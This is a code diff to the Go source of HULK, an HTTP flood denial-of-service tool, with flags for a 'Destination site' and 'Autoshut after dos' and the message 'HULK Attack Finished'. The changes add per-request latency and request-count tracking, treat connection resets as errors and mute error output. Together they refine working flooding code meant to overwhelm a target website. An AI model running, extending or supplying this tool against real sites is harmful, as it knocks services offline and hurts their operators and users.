@@ -19,17 +19,24 @@ import (
 	"os/signal"
 	"strconv"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"syscall"
+	"time"
 )
 
-const __version__  = "1.0.1"
+const __version__ = "1.0.1"
+
+var mu *sync.Mutex
+var rtime time.Duration
+var reqs int64
+var startT time.Time
 
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
-	callGotOk              uint8 = iota
+	callGotOk uint8 = iota
 	callExitOnErr
 	callExitOnTooManyFiles
 	targetComplete
@@ -83,6 +90,10 @@ func main() {
 		headers arrayFlags
 	)
 
+	mu = &sync.Mutex{}
+	reqs = 1
+	startT = time.Now()
+
 	flag.BoolVar(&version, "version", false, "print version and exit")
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
@@ -131,22 +142,28 @@ func main() {
 		)
 		fmt.Println("In use               |\tResp OK |\tGot err")
 		for {
+			t := time.Now()
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
-			if sent%10 == 0 {
-				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-			}
+			// if sent%10 == 0 {
+			fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d |\t%6vms", cur, maxproc, sent, err, float64(int64(rtime)/int64(time.Millisecond))/float64(reqs))
+			// }
 			switch <-ss {
 			case callExitOnErr:
+				updateTime(t)
 				atomic.AddInt32(&cur, -1)
 				err++
 			case callExitOnTooManyFiles:
+				updateTime(t)
 				atomic.AddInt32(&cur, -1)
 				maxproc--
+				err++
 			case callGotOk:
+				updateTime(t)
 				sent++
 			case targetComplete:
+				updateTime(t)
 				sent++
 				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
 				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
@@ -158,7 +175,16 @@ func main() {
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
-	fmt.Println("\r\n-- Interrupted by user --        \n")
+	fmt.Printf("\r\n-- Interrupted by user --        \n")
+	fmt.Printf("sent %d requests over %s\n", reqs, time.Since(startT).String())
+}
+
+func updateTime(t time.Time) {
+	td := time.Since(t)
+	mu.Lock()
+	rtime += td
+	reqs++
+	mu.Unlock()
 }
 
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
@@ -205,11 +231,17 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 
 		r, e := client.Do(q)
 		if e != nil {
-			fmt.Fprintln(os.Stderr, e.Error())
+			// fmt.Fprintln(os.Stderr, e.Error())
 			if strings.Contains(e.Error(), "socket: too many open files") {
+				// fmt.Println("call on exit err")
 				s <- callExitOnTooManyFiles
 				return
+			} else if strings.Contains(e.Error(), "read: connection reset by peer") {
+				// fmt.Println(e.Error())
+				s <- callExitOnErr
+				return
 			}
+			// fmt.Println("other error = ", e.Error())
 			s <- callExitOnErr
 			return
 		}
